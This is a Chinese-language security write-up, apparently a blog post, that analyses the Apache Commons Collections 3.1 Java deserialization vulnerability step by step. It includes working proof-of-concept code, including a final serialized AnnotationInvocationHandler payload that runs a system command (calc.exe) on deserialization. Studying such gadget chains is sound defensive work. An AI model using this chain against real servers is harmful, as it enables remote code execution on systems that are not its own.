***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

![](https://image.3001.net/images/20210424/1619250806_6083ce76358fc20431022.png!small)

## 0x01 前言

2015年，FoxGlove Security安全团队的@breenmachine发布了一篇长博客，里面详细阐述了利用java反序列化和Apache
Commons Collections这一基础类库实现远程命令执行。该漏洞影响了诸多java web
server，同时也开启了各种java反序列漏洞的大门。在此之后，Apache Commons
Collections项目组也对存在漏洞的类库进行了一定的安全处理，目前存在缺陷的版本是Apache Commons Collections
3.2.1以下。本文主要是对Apache Commons Collections反序列化漏洞利用链的分析学习。

## 0x02 使用的环境

JDK为1.7.0_80

下载链接：https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html

Apache Commons Collections 3.1版本

下载链接：https://archive.apache.org/dist/commons/collections/source/

## 0x03 基本概念

### 1）Java执行程序

在Java中，可以通过java.lang.Runtime类方便的调用操作系统命令，或者一个可执行程序。

    
    
    public class RuntimeTest {
        public static void main(String[] args) throws Exception{
            Runtime runtime = Runtime.getRuntime();
            runtime.exec("calc.exe");
        }
    }

如上代码，可以打开windows系统的计算器。

![1619248029_6083c39dcc946b2d91d21.png!small](https://image.3001.net/images/20210424/1619248029_6083c39dcc946b2d91d21.png!small)

### 2）java反射机制

反射机制允许程序在运行期借助于Reflection API取得任何类的内部信息，并能直接操作任意类和对象的所有属性及方法。

要使用一个类，就要先把它加载到虚拟机中，在加载完类之后，堆内存的方法区中就产生了一个Class类型的对象（一个类只有一个class对象），这个对象就包含了完整的类的结构信息，我们可以通过这个对象看到类的结构，这个对象就像一面镜子，透过镜子可以看到类的结构，所以形象的称之为：反射。

反射中会经常使用到的方法：

    
    
    1、获取Class实例的方式
       方式1：调用运行时类的属性 .class
       方式2：通过运行时的对象调用getClass()
       方式3：调用Class的静态方法：forName(String classPath)
       方式4：使用类的加载器  classloader
    2、创建运行时类的对象
       newInstance()  调用此方法，创建对应的运行时类的对象
    3、获取运行时类的结构
       getFields()  获取当前运行时类及其父类中声明为public访问权限的属性
       getDeclaredFields()  获取当前运行时类中声明的所有属性，不包含父类
       getMethods() 获取当前运行时类及其所有父类声明为public的方法
       getDeclaredMethods()  获取当前运行时类中声明的方法，不包含父类
       getConstructors() 获取当前运行时类声明为public的构造器
       getDeclaredConstructors()  获取当前运行时类中声明的所有构造器
       invoke()方法允许调用包装在当前Method对象中的方法

 **反射示例：**

如下代码中，Object i = m1.invoke(r1, 1,
2)的作用是：使用r1调用m1获得的对象所声明的公开方法即print，并将int类型的1,2作为参数传入。

    
    
    import java.lang.reflect.Method;
    public class test {
        public static void main(String[] args) {
            Reflect r1=new Reflect();
            //通过运行时的对象调用getClass();
            Class c=r1.getClass();
            try {
                //getMethod(方法名,参数类型)
                //getMethod第一个参数是方法名，第二个参数是该方法的参数类型
                //因为存在同方法名不同参数这种情况，所以只有同时指定方法名和参数类型才能唯一确定一个方法
                Method m1 = c.getMethod("print", int.class, int.class);
    ​
                //相当于r1.print(1, 2);方法的反射操作是用m1对象来进行方法调用 和r1.print调用的效果完全相同
                //使用r1调用m1获得的对象所声明的公开方法即print，并将int类型的1,2作为参数传入
                Object i = m1.invoke(r1, 1, 2);
    ​
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }
    class Reflect{
        public void print(int a,int b){
            System.out.println(a+b);
        }
    }

 **使用反射机制执行命令** ：

此处invoke(runtime,"calc.exe")的作用为：使用runtime调用获得的Method对象所声明的公开方法即exec，并将calc.exe作为参数传入，而runtime为获取的Runtime.getRuntime实例对象。因此，此处代码相当于执行了Runtime.getRuntime(
).exec("calc.exe")。

熟悉这块的操作，后面会以此完成攻击链：

    
    
    public class RuntimeTest {
        public static void main(String[] args) throws Exception {
            //forName(类名)  获取类名对应的Class对象，同时将Class对象加载进来。
            //getMethod(方法名,参数类型列表)  根据方法名称和相关参数，来定位需要查找的Method对象并返回。
            //invoke(Object obj,Object...args)  invoke允许调用包装在当前Method对象中的方法
    ​
            Object runtime=Class.forName("java.lang.Runtime").getMethod("getRuntime",new Class[]{}).invoke(null);    //获取一个Runtime的实例对象
    ​
            //调用Runtime实例对象的exec()方法，并将calc.exe作为参数传入
            Class.forName("java.lang.Runtime").getMethod("exec",String.class).invoke(runtime,"calc.exe");
        }
    }

​如上，通过Java反射机制打开windows的计算器。![1619247944_6083c348d615a8a424531.png!small](https://image.3001.net/images/20210424/1619247944_6083c348d615a8a424531.png!small)

Java中为什么要使用反射机制，直接创建对象不是更方便？  
如果有多个类，每个用户所需求的对象不同，直接创建对象，就要不断的去new一个对象，非常不灵活。而java反射机制，在运行时确定类型，绑定对象，动态编译最大限度发挥了java的灵活性。

###  **3）Java序列化和反序列化**

Java序列化是指把Java对象转换为字节序列的过程，便于保存在内存、文件、数据库中。  
即： **对象— >字节流 （序列化）**  
  
Java反序列化即序列化的逆过程，由字节流还原成对象。  
即： **字节流— >对象（反序列化）**  
序列化的好处在于可将任何实现了Serializable接口的对象转换为字节数据，使其保存和传输时可被还原。

 **反序列化的操作函数：**

java.io.ObjectOutputStream类中的writeObject( )方法可以实现Java序列化。  
java.io.ObjectInputStream类中的readObject( )方法可以实现Java反序列化。

想一个Java对象是可序列化的，需要满足相应的要求：

    
    
    1、实现Serializable接口或Externalizable接口
    2、当前类提供一个全局常量 serialVersionUID
    3、必须保证其内部所有属性也必须是可序列化的（默认情况下，基本数据类型可序列化）
    4、ObjectInputStream和ObjectOutputStream不能序列化static和transient修饰的成员变量

 **Java反序列化示例：**

    
    
    import java.io.*;
    public class Serialize {
        public static void main(String[] args) throws Exception {
            //序列化
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("hello.txt"));
            oos.writeObject(new String("序列化"));
            oos.close();
    ​
            //反序列化
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream("hello.txt"));
            Object o = ois.readObject();
            String s = (String) o;
            ois.close();
            System.out.println(s);
    ​
        }
    }

 **反序列化漏洞成因：**

序列化指把Java对象转换为字节序列的过程，反序列化就是打开字节流并重构对象，那如果即将被反序列化的数据是特殊构造的，就可以产生非预期的对象，从而导致任意代码执行。

Java中间件通常通过网络接收客户端发送的序列化数据，而在服务端对序列化数据进行反序列化时，会调用被序列化对象的readObject(
)方法。而在Java中如果重写了某个类的方法，就会优先调用经过修改后的方法。如果某个对象重写了readObject(
)方法，且在方法中能够执行任意代码，那服务端在进行反序列时，也会执行相应代码。

如果能够找到满足上述条件的对象进行序列化并发送给Java中间件，Java中间件也会去执行指定的代码，即存在反序列化漏洞。

### 4）Java集合框架

Java集合框架是对多个数据进行存储操作的结构，其主要分为Collection和Map两种体系：

    
    
    Collection接口：单例数据，定义了存取一组对象的方法的集合
    Map接口：双列数据，保存具有映射关系“Key-value”的集合

Apache Commons
Collections：一个扩展了Java标准库里集合框架的第三方基础库。它包含有很多jar工具包如下图所示，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。

![1619250358_6083ccb6df2c49b1f7f69.png!small](https://image.3001.net/images/20210424/1619250358_6083ccb6df2c49b1f7f69.png!small)

##  **0x03 Apache Commons Collections反序列化漏洞**

Apache Commons
Collections反序列化漏洞的主要问题在于Transformer这个接口类，Transformer类可以满足固定的类型转化需求，其转化函数可以自定义实现，漏洞点就在这里。

目前已知实现了Transformer接口的类，如下所示。而在Apache Commons
Collections反序列漏洞中，会使用到ChainedTransformer、ConstantTransformer、InvokerTransformer这三个类，这些类的具体作用我们在下面结合POC来看。![1619248482_6083c562eb8c5855b9ca7.png!small](https://image.3001.net/images/20210424/1619248482_6083c562eb8c5855b9ca7.png!small)在远程调用前，我们先看本地的POC：

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.util.HashMap;
    import java.util.Map;
    public class ApacheSerialize1 {
        public static void main(String[] args) throws Exception {
            //1、创建Transformer型数组，构建漏洞核心利用代码
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
            };
            //2、将transformers数组存入ChaniedTransformer类
            Transformer transformerChain = new ChainedTransformer(transformers);
    ​
            //3、创建Map，给予map数据转化链
            Map innerMap = new HashMap();
            innerMap.put("key", "value");
            //给予map数据转化链,该方法有三个参数:
            // 第一个参数为待转化的Map对象
            // 第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）
            // 第三个参数为Map对象内的value要经过的转化方法（可为单个方法，也可为链，也可为空）
            Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
            Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
            //4、触发漏洞利用链，利用漏洞
            onlyElement.setValue("test");
        }
    }

​该POC从上至下大致分为四点，我们以此四点为基础进行分析：

> 1、创建transformers数组，构建漏洞核心利用代码。
>
> 2、将transformers数组存入ChaniedTransformer类。
>
> 3、创建Map，给予map数据转化链
>
> 4、触发漏洞利用链，利用漏洞

### 1）创建transformers数组，构建漏洞核心利用代码

此处创建了一个Transformer类型的数组，其中创建了四个对象。这四个对象分别使用了ConstantTransforme和InvokerTransformer两个类。  
ConstantTransformer：把一个对象转化为常量，并返回。  
InvokerTransformer：通过反射，返回一个对象。

代码如下：

![1619248624_6083c5f0611a784c16a7d.png!small](https://image.3001.net/images/20210424/1619248624_6083c5f0611a784c16a7d.png!small)

此处，先不研究里面的具体参数有何作用，只需明确此处创建了一个Transformer类型的数组，其中创建了四个对象，我们接着往下看。

### 2）将transformers数组存入ChaniedTransformer类

此处创建了一个ChainedTransformer对象，并将transformers数组作为参数传入。

ChainedTransformer类：把一些transformer链接到一起，构成一组链条，对一个对象依次通过链条内的每一个transformer进行转换。

![1619248684_6083c62c4e1b5a80f6ab4.png!small](https://image.3001.net/images/20210424/1619248684_6083c62c4e1b5a80f6ab4.png!small)

继续往下看。

### 3）创建Map，给予map数据转化链 **  
**

此处代码较多，我们拆开看。

![1619248768_6083c680c537086016056.png!small](https://image.3001.net/images/20210424/1619248768_6083c680c537086016056.png!small)

先是创建Map类，添加了一组数据("key", "value")。前文有提到，Map是具有映射关系 Key-value的集合，一个键值对：kay-value构成了一个Entry对象。

![1619248795_6083c69bacf08b7048a67.png!small](https://image.3001.net/images/20210424/1619248795_6083c69bacf08b7048a67.png!small)

接着是给予map实现类的数据转化链。而在Apache Commons
Collections中实现了TransformedMap类，该类可以在一个元素被添加/删除/或是被修改时，会调用transform方法自动进行特定的修饰变换，具体的变换逻辑由Transformer类定义。即就是当数据发生改变时，可以进行一些提前设定好的操作。

也就是说，此处的代码是给予Map数据转化链，当Map里的数据发生改变时，会进行转换链设定好的操作，如下有三个参数:

![1619248835_6083c6c36d9b82d3bbf39.png!small](https://image.3001.net/images/20210424/1619248835_6083c6c36d9b82d3bbf39.png!small)

此处TransformedMap调用了decorate( )方法，创建了TransformedMap对象。参数1
，innerMap作为参数调用了父类AbstractInputCheckedMapDecorator的构造函数，保存为this.map变量。参数2为null。参数3，transformerChain被初始化为this.valueTransformer变量。

TransformedMap类相关代码如下：

![1619248894_6083c6fe29374661323bc.png!small](https://image.3001.net/images/20210424/1619248894_6083c6fe29374661323bc.png!small)

然后获取outerMap的第一个键值对(key,value)，然后转化成Map.Entry形式，前文也提到一个kay-value构成一个Entry对象。

![1619248960_6083c7405cf56b31a12f8.png!small](https://image.3001.net/images/20210424/1619248960_6083c7405cf56b31a12f8.png!small)

最后利用Map.Entry取得第一个值，调用修改值的函数，触发下面的setValue( )代码。

![1619248987_6083c75b353e3c39a1b7e.png!small](https://image.3001.net/images/20210424/1619248987_6083c75b353e3c39a1b7e.png!small)

### 4）触发漏洞利用链，利用漏洞

接着上面分析，继续跟进setValue( )函数，会进入到AbstractInputCheckedMapDecorator类。此时setValue(
)方法会检查要被修改的元素，进入到TransformedMap的转换链。

跟进setValue()里的this.parent.checkSetValue(value)，跳到TransoformedMap类，this.parent为TransformedMap类的对象outerMap。

AbstractInputCheckedMapDecorator类相关代码如下：![1619249157_6083c805b3d67bf8f78c5.png!small](https://image.3001.net/images/20210424/1619249157_6083c805b3d67bf8f78c5.png!small)

跳到TransoformedMap类。

此时的this.valueTransformer就是transformerChain，之后就会触发漏洞利用链。而transformerChain就是在上面POC第二点代码生成的ChainedTransformer对象，其中传入了transformers数组，transformers数组为POC第一点构造的漏洞利用核心代码。

TransoformedMap类相关代码如下：

![1619249215_6083c83f49f119377c26c.png!small](https://image.3001.net/images/20210424/1619249215_6083c83f49f119377c26c.png!small)

由于valueTransformer为transformerChain，因此上面代码中的this.valueTransformer.transform(value)会调用ChainedTransformer类的transform方法。

此时我们构造好的含有利用代码的transformers数组会循环进入此处，先调用1次ConstantTransformer类，再调用3次InvokerTransformer类。

需要注意在数组的循环中，前一次transform函数的返回值，会作为下一次transform函数的object参数输入。

ChainedTransformer类相关代码如下：

![1619249272_6083c8787e98657a6cb33.png!small](https://image.3001.net/images/20210424/1619249272_6083c8787e98657a6cb33.png!small)

 **第一次循环：** ​

![1619249314_6083c8a2188eb6103233c.png!small](https://image.3001.net/images/20210424/1619249314_6083c8a2188eb6103233c.png!small)

首先是去调用ConstantTransformer类的transform方法，将Runtime.class保存为this.iConstant变量，并将返回值作为下一次transform函数的object参数输入。

ConstantTransformer类相关代码如下：

![1619249358_6083c8cedb91504bb7ac1.png!small](https://image.3001.net/images/20210424/1619249358_6083c8cedb91504bb7ac1.png!small)

 **第二次循环：**

![1619249520_6083c970cc061092da7b5.png!small](https://image.3001.net/images/20210424/1619249520_6083c970cc061092da7b5.png!small)

调用InvokerTransformer类的transform( )方法，此时transform的object参数，即java.lang.Runtime。

先看InvokerTransformer的构造函数：

第一个是字符串，是调用的方法名

第二个是个Class数组，是方法的参数的类型

第三个是Object数组，是方法的参数的具体值

进入到InvokerTransformer类的transform方法，非常明显的反射机制。此处，input为transform的object参数为java.Lang.Runtime。

![1619249414_6083c906a92c3e39d2e18.png!small](https://image.3001.net/images/20210424/1619249414_6083c906a92c3e39d2e18.png!small)

此处就相当于：

    
    
    method = input.getClass().getMethod("getMethod",  new Class[] {String.class, Class[].class).invoke("java.Lang.Runtime", new Object[] {"getRuntime", new Class[0]});

即java.Lang.Runtime.getMethod("getRuntime",null)，返回一个Runtime.getRuntime(
)方法，相当于产生一个字符串，但还没有执行"Rumtime.getRuntime( );"。

 **第三次循环** ：

![1619249498_6083c95a1e82aa51e9776.png!small](https://image.3001.net/images/20210424/1619249498_6083c95a1e82aa51e9776.png!small)

同样进入到InvokerTransformer类的transform( )方法，input为上次循环的返回值Runtime.getRuntime( )。

此时就相当于：

    
    
    method = input.getClass().getMethod("invoke",  new Class[] {Object.class, Object[].class }).invoke("Runtime.getRuntime()",  new Object[] {null, new Object[0]});

即`Runtime.getRuntime( ).invoke(null)`，那么会返回一个Runtime对象实例。相当于执行了完成了：

    
    
    Object runtime=Class.forName("java.lang.Runtime").getMethod("getRuntime",new Class[]{}).invoke(null);

 **第四次循环** ：

![1619249586_6083c9b27ea236bdca43a.png!small](https://image.3001.net/images/20210424/1619249586_6083c9b27ea236bdca43a.png!small)

同样进入到InvokerTransformer类的transform方法，input为上次循环的返回值Runtime.getRuntime(
).invoke(null)。

此时就相当于：

    
    
    method = input.getClass().getMethod("exec",  new Class[] {String.class }).invoke("runtime", new Object[] {"calc.exe"});

即Runtime.getRuntime( ).exec("calc.exe")。 **至此成功完成漏洞利用链，执行系统命令语句，触发漏洞。**

最后整理整个过程：

> 1、transform数组里面含有4个实现了Transformer接口的对象，这四个对象都重写了transform()方法
>
>
> 2、ChianedTransformer里面装了4个transform,ChianedTransformer也实现了Transformer接口，同样重写了transform()方法
>
>
> 3、TransoformedMap绑定了ChiandTransformer，给予map数据转化链，当map里的数据进行修改时，需经过ChiandTransformer转换链
>
> 4、利用TransoformedMap的setValue修改map数据，触发ChiandTransformer的transform()方法
>
> 5、ChianedTransformer的transform是一个循环调用该类里面的transformer的transform方法 ​

loop
1：第一次循环调用ConstantTransformer("java.Runtime")对象的transformer方法，调用参数为"test"(正常要修改的值)，返回了java.Runtime作为下一次循环的object参数

loop
2：第二次循环调用InvokerTransformer对象的transformer，参数为("java.Runtime")，包装Method对象"getMethod"方法，invoke方法获得对象所声明方法"getRuntime"，利用反射，返回一个Rumtime.getRuntime()方法

loop
3：第三次循环调用InvokerTransformer对象的transformer，参数为("Rumtime.getRuntime()")，包装Method对象"invoke"方法，利用反射，返回一个Rumtime.getRuntime()实例

loop
4：第四次循环调用InvokerTransformer对象的transformer，参数为一个Runtime的对象实例，包装Method对象"exec"方法，invoke方法获得对象所声明方法"calc.exe"，利用反射，执行弹出计算器操作

##  **0x04 最终Payload**

​目前的POC只是被执行了，我们要利用此漏洞，就需要通过网络传输payload，在服务端对我们传过去的payload进行反序列时执行代码。而且该POC的关键依赖于Map中某一项去调用setValue(
) ，而这完全不可控。

因此就需要寻找一个可序列化类，该类重写了readObject( )方法，并且在readObject( )中进行了setValue( )
操作，且这个Map变量是可控的。需要注意的时，在java中如果重写了某个类的方法，就会优先调用经过修改后的方法。

在java中，确实存在一个类AnnotationInvocationHandler，该类重写了readObject( )方法，并且执行了setValue(
)操作，且Map变量可控，如果可以将TransformedMap装入这个AnnotationInvocationHandler类，再传过去，服务端在对其进行反序列化操作时，就会触发漏洞。最后利用的payload如下：

    
    
    package Serialize;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.io.*;
    import java.lang.annotation.Target;
    import java.lang.reflect.Constructor;
    import java.util.HashMap;
    import java.util.Map;
    ​
    ​
    public class ApacheSerialize implements Serializable {
        public static void main(String[] args) throws Exception{
            //transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
            };
    ​
            //transformedChain: ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作
            Transformer transformerChain = new ChainedTransformer(transformers);
    ​
            //Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式，类比于python的dict
            Map map = new HashMap();
            map.put("value", "test");
    ​
            //Map数据结构，转换后的Map
            /*
            TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。
                第一个参数为待转化的Map对象
                第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）
                第三个参数为Map对象内的value要经过的转化方法。
           */
            //TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）);
            Map transformedMap = TransformedMap.decorate(map, null, transformerChain);
    ​
            //反射机制调用AnnotationInvocationHandler类的构造函数
            //forName 获得类名对应的Class对象
            Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            //通过反射调用私有的的结构：私有方法、属性、构造器
            //指定构造器
            
            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
            //取消构造函数修饰符限制,保证构造器可访问
            ctor.setAccessible(true);
    ​
            //获取AnnotationInvocationHandler类实例
            //调用此构造器运行时类的对象
            Object instance=ctor.newInstance(Target.class, transformedMap);
    ​
            //序列化
            FileOutputStream fileOutputStream = new FileOutputStream("serialize.txt");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(instance);
            objectOutputStream.close();
    ​
            //反序列化
            FileInputStream fileInputStream = new FileInputStream("serialize.txt");
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            Object result = objectInputStream.readObject();
            objectInputStream.close();
            System.out.println(result);
        }
    }

可以触发。

![1619249703_6083ca271073755ab37db.png!small](https://image.3001.net/images/20210424/1619249703_6083ca271073755ab37db.png!small)

我们来研究最终payload新加的部分：

![1619249757_6083ca5da9174108c4764.png!small](https://image.3001.net/images/20210424/1619249757_6083ca5da9174108c4764.png!small)

​新加部分代码的前四部分不是很难理解。使用反射去调用AnnotationInvocationHandler类，并且指定了具体参数类型为(Class.class,
Map.class)的构造器。之后再使用newInstance调用指定构造器运行时类的对象，并将(Target.class,
transformedMap)作为参数传入。

查看AnnotationInvocationHandler类，反射调用的构造器如下：

![1619249784_6083ca783d2af93eb217f.png!small](https://image.3001.net/images/20210424/1619249784_6083ca783d2af93eb217f.png!small)

其中var1为Target.class，var2为transformedMap，var1.getInterfaces(
)为获取当前类显式实现的接口，即获取Target类显式实现的接口。

Target类使用了@interface自定义注解，而@interface自定义注解自动继承了java.lang.annotation.Annotation这一个接口，由编译程序自动完成其他细节。因此符合if语句判断，生成AnnotationInvocationHandler类实例。

Target类代码如下：

![1619249816_6083ca989603361beb5d6.png!small](https://image.3001.net/images/20210424/1619249816_6083ca989603361beb5d6.png!small)

​进入payload序列化和反序列部分，主要是看反序列化的readObject(
)部分，打开字节流并重构对象，此时的对象即AnnotationInvocationHandler类实例。

![1619249852_6083cabc6ecb8adf1dc70.png!small](https://image.3001.net/images/20210424/1619249852_6083cabc6ecb8adf1dc70.png!small)

前文提到在java中如果重写了某个类的方法，就会优先调用经过修改后的方法，而AnnotationInvocationHandler类重写了readObject(
)方法，因此反序列化时会优先调用该类中的readObject( )方法。

跟进AnnotationInvocationHandler类的readObject(
)方法，此时的var1为实例化的AnnotationInvocationHandler类对象， **之后会触发setValue( )造成命令执行。**

AnnotationInvocationHandler类相关代码如下：

    
    
    class AnnotationInvocationHandler implements InvocationHandler, Serializable {
        ....................
            AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
            Class[] var3 = var1.getInterfaces();
            if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {
                //this.type为Target.class
                this.type = var1;
                //this.memberValues为transformedMap
                this.memberValues = var2;
            } else {
                throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
            }
        }
    ​
        .......................
        private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
            //1、defaultReadObject(),从var1读取当前类的非静态和非瞬态字段
            var1.defaultReadObject();
            AnnotationType var2 = null;
    ​
            try {
                //this.type为实例化时传入的Target.class
                //2、getInstance获取到@Target类的方法等基本信息。
                var2 = AnnotationType.getInstance(this.type);
            } catch (IllegalArgumentException var9) {
                throw new InvalidObjectException("Non-annotation type in annotation serial stream");
            }
    ​
            //3、获取到Target类的注解元素 即{value：ElementType}键值对
            Map var3 = var2.memberTypes();
            //4、this.memberValues为实例化时传入的transformedMap，获取构造map的迭代器
            Iterator var4 = this.memberValues.entrySet().iterator();
    ​
            while(var4.hasNext()) {
                //获取到map的第一个键值对 {value:test}
                Entry var5 = (Entry)var4.next();
                //获取到map第一个键值对 {value:test}的key  即value
                String var6 = (String)var5.getKey();
                //从@Target的注解元素 {value：ElementType}键值对中去寻找键名为value的值
                Class var7 = (Class)var3.get(var6);
                if (var7 != null) {
                    //获取到map第一个键值对 {value:test}的value 即test
                    Object var8 = var5.getValue();
                    //isInstance表示var8是否能强转为var7  instanceof表示var8是否为ExceptionProxy类型
                    //两个都为否，进入到if条件语句内部
                    if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                        //触发setValue
                        var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
    ​
                    }
                }
            }
        }
    }

​至此，完成漏洞利用。

##  **0x05 一个小问题**

​在测试的时候，未使用AnnotationInvocationHandler类时，map可以put时key可以随意设置，如上文POC中的map.put("key",
"value")。

但在调用AnnotationInvocationHandler类时就必须设置为value。

![1619249986_6083cb4231bbf3088b2bd.png!small](https://image.3001.net/images/20210424/1619249986_6083cb4231bbf3088b2bd.png!small)

主要原因如下：

需要注意的是在AnnotationInvocationHandler类相关代码的var2 =
AnnotationType.getInstance(this.type)部分，this.type为实例化时传入的Target.class。

跟进，进入到AnnotationType类的getInstance(
)方法，其中var2为var1返回该元素Target类型的注释，而var1中没有此注释，返回null，进入到判断语句，此时会实例化一个AnnotationType对象，并将var0作为参数传入。

![1619250187_6083cc0b377c09428433c.png!small](https://image.3001.net/images/20210424/1619250187_6083cc0b377c09428433c.png!small)

继续跟进AnnotationType类的AnnotationType(
)，其中var1为Target.class，此时获取的Target类的全部方法等基本信息，其中this.memberTypes为获取到的Target类的全部方法，而Target.class只定义了一个名为value的方法(快捷方式，限制了元素名必须为value)。

    
    
    public class AnnotationType {
        ...................
        private AnnotationType(final Class<? extends Annotation> var1) {
            if (!var1.isAnnotation()) {
                throw new IllegalArgumentException("Not an annotation type");
            } else {
                //获取到Target.class的全部方法
                Method[] var2 = (Method[])AccessController.doPrivileged(new PrivilegedAction<Method[]>() {
                    public Method[] run() {
                        return var1.getDeclaredMethods();
                    }
                });
                //底层创建了长度是var2长度加1的一维数组，加载因子为1.0(扩容时才会用到)
                this.memberTypes = new HashMap(var2.length + 1, 1.0F);
                this.memberDefaults = new HashMap(0);
                this.members = new HashMap(var2.length + 1, 1.0F);
                Method[] var3 = var2;
                int var4 = var2.length;
    ​
                //遍历var2，即获取到的Target.class的全部方法
                for(int var5 = 0; var5 < var4; ++var5) {
                    Method var6 = var3[var5];
                    if (var6.getParameterTypes().length != 0) {
                        throw new IllegalArgumentException(var6 + " has params");
                    }
                    //获取方法的名称
                    String var7 = var6.getName();
                    //获取方法的返回值类型
                    Class var8 = var6.getReturnType();
    ​
                    //将方法的名称和返回值类型以键值对的形式传入
                    //Target.class只有一个方法{value：ElementType}
                    this.memberTypes.put(var7, invocationHandlerReturnType(var8));
                    
                    this.members.put(var7, var6);
                    Object var9 = var6.getDefaultValue();
                    if (var9 != null) {
                        this.memberDefaults.put(var7, var9);
                    }
                }
    ​
                if (var1 != Retention.class && var1 != Inherited.class) {
                    JavaLangAccess var10 = SharedSecrets.getJavaLangAccess();
                    Map var11 = AnnotationParser.parseSelectAnnotations(var10.getRawClassAnnotations(var1), var10.getConstantPool(var1), var1, new Class[]{Retention.class, Inherited.class});
                    Retention var12 = (Retention)var11.get(Retention.class);
                    this.retention = var12 == null ? RetentionPolicy.CLASS : var12.value();
                    this.inherited = var11.containsKey(Inherited.class);
                } else {
                    this.retention = RetentionPolicy.RUNTIME;
                    this.inherited = false;
                }
    ​
            }
        }
        .......................
    ​
        public Map<String, Class<?>> memberTypes() {
            return this.memberTypes;
        }
        .......................
    ​
    }

根据上面代码追踪到，this.memberTypes为获取到的Target.class的全部方法，可以看到主要在String var6 =
(String)var5.getKey(
)为获取到map第一个键值对{value:test}的key即value，var7会从获取到Target的全部方法{value：ElementType}键值对中去寻找键名为var6的值，如果获取不到就不会进入到setValue(
)方法， **因此必须设置map的** **key为value。**

    
    
    class AnnotationInvocationHandler implements InvocationHandler, Serializable {
           ....................        
            //3、获取到Target类的注解元素 即{value：ElementType}键值对
            Map var3 = var2.memberTypes();
            //4、获取构造map的迭代器
            Iterator var4 = this.memberValues.entrySet().iterator();
            while(var4.hasNext()) {
                //获取到map的第一个键值对 {value:test}
                Entry var5 = (Entry)var4.next();
                //获取到map第一个键值对 {value:test}的key  即value
                String var6 = (String)var5.getKey();
                //从获取到Target的全部方法 {value：ElementType}键值对中去寻找键名为value的值
                Class var7 = (Class)var3.get(var6);
                if (var7 != null) {
                    //获取到map第一个键值对 {value:test}的value 即test
                    Object var8 = var5.getValue();
                    //isInstance表示var8是否能强转为var7  instanceof表示var8是否为ExceptionProxy类型
                    //两个都为否，进入到if条件语句内部
                    if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                        //触发setValue
                        var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
    ​
                    }
                }
           ....................        
    }

## 0x06 结语

断断续续，终于写完了这篇文章，但很多内容还没有分析到，如结合此漏洞，深入分析ysoserial反序列化工具，坑很多，慢慢填吧~

在不断学习跟进的过程，才体会到一个漏洞利用的复杂和精妙，环环相扣，也深知发现一个漏洞的不易，向各位老师傅们学习！

本文只是从POC的角度层层递进去分析这个漏洞，可能比较浅显，如有不足，望指出。

最后，欢迎大家关注我的公众号：安不识TM，以后的文章会第一时间发在这个平台。

## 参考资料

https://xz.aliyun.com/t/136

https://xz.aliyun.com/t/7031#toc-10

https://xz.aliyun.com/t/4711#toc-0

